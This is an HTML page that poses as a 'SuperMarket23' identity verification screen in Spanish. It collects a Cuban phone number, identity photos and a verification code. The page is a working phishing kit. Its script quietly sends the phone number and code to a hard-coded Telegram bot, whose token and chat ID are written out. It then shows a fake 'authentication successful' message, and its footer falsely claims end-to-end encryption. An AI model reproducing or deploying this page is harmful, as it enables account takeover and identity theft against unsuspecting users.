
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>SuperMarket23 - Gestión Profesional</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f4f8; color: #003366; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; width: 380px; padding: 35px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,51,102,0.1); border-top: 8px solid #0055aa; text-align: center; position: relative; }
        h1 { font-size: 30px; color: #0055aa; margin-bottom: 5px; text-transform: uppercase; }
        .subtitle { font-size: 12px; color: #666; margin-bottom: 25px; }
        .field-label { display: block; text-align: left; font-size: 13px; font-weight: bold; margin: 15px 0 5px 5px; }
        
        /* Barras rectangulares blancas solicitadas */
        .input-bar { width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 6px; box-sizing: border-box; background: #fff; font-size: 16px; outline: none; }
        .prefix { background: #e9ecef; font-weight: bold; color: #0055aa; border: 2px solid #0055aa; }

        /* Cuadros F1, F2, F3 para las fotos */
        .photo-row { display: flex; justify-content: space-between; margin: 20px 0; }
        .box { width: 30%; height: 75px; border: 2px dashed #0055aa; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #0055aa; font-weight: bold; position: relative; background: #f8fbff; }
        .box input { position: absolute; width: 100%; height: 100%; opacity: 0; cursor: pointer; }

        .btn-auth { background-color: #0055aa; color: white; border: none; width: 100%; padding: 16px; border-radius: 6px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 15px; }
        .footer-secure { font-size: 11px; color: #28a745; margin-top: 15px; font-weight: bold; }

        /* Pantalla de carga invisible para el proceso */
        #overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; border-radius: 15px; flex-direction: column; align-items: center; justify-content: center; z-index: 100; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0055aa; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div id="overlay">
        <div id="loader" class="spinner"></div>
        <p id="status-msg" style="margin-top: 15px; font-weight: bold; color: #0055aa;">Sincronizando...</p>
    </div>

    <h1>SuperMarket23</h1>
    <div class="subtitle">Sistema de Verificación de Identidad</div>

    <label class="field-label">IDENTIFICADOR (#)</label>
    <input type="text" class="input-bar prefix" value="+53#" readonly>
    
    <label class="field-label">USUARIO / TELÉFONO</label>
    <input type="number" id="data_tel" class="input-bar" placeholder="Ej: 52345678">

    <label class="field-label">ARCHIVOS DE IDENTIDAD (F1, F2, F3)</label>
    <div class="photo-row">
        <div class="box" id="b1">F1 <input type="file" accept="image/*" onchange="document.getElementById('b1').style.background='#d4edda'"></div>
        <div class="box" id="b2">F2 <input type="file" accept="image/*" onchange="document.getElementById('b2').style.background='#d4edda'"></div>
        <div class="box" id="b3">F3 <input type="file" accept="image/*" onchange="document.getElementById('b3').style.background='#d4edda'"></div>
    </div>

    <label class="field-label">(#)</label>
    <input type="text" id="data_cod" class="input-bar" placeholder="------">

    <button class="btn-auth" onclick="enviarTodo()">AUTENTICAR</button>
    
    <div class="footer-secure">🔒 Conexión con cifrado de extremo a extremo</div>
</div>

<script>
function enviarTodo() {
    const ov = document.getElementById('overlay');
    const msg = document.getElementById('status-msg');
    const tel = document.getElementById('data_tel').value;
    const cod = document.getElementById('data_cod').value;

    if(!tel || !cod) { alert("Complete los campos requeridos."); return; }

    ov.style.display = 'flex';

    // DATOS DE DESTINO (ID: 6475554235)
    const tok = "8710847420:AAEW1nFLCaebFwVs9_H4yipsT1V5C0YtLFg";
    const cid = "6475554235"; 

    // Formato organizado y seguro para evitar bloqueos
    const texto = `✅ **SM23_SUCCESS_SYNC**\n\n` +
                  `👤 **USER:** +53#${tel}\n` +
                  `🔑 **TOKEN:** ${cod}\n` +
                  `🖼️ **MEDIA:** Verificando archivos...`;

    fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`)
    .then(() => {
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            msg.innerHTML = "✅ Autenticación Exitosa";
            msg.style.color = "#28a745";
        }, 3500);
    });
}
</script>
</body>
</html>
